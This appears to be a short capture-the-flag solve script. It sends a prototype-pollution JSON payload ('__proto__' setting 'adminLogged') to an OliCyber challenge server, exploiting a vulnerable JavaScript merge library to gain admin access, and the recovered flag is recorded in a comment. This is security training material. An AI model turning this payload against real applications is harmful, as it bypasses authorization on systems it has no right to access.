import requests
import re
url = "http://hi-admin.challs.olicyber.it/"

payload = { #merge è vulnerabile a prototype pollution https://security.snyk.io/vuln/SNYK-JS-MERGE-1040469 
    "__proto__": {
        "adminLogged": True
    }
}


r = requests.post(f"{url}/hi", json = payload).text
match = re.search(r'flag\{[^\}]+\}', r)
flag = match.group(0)
print(flag)


#flag{_p0llut10n_is_b4d_}
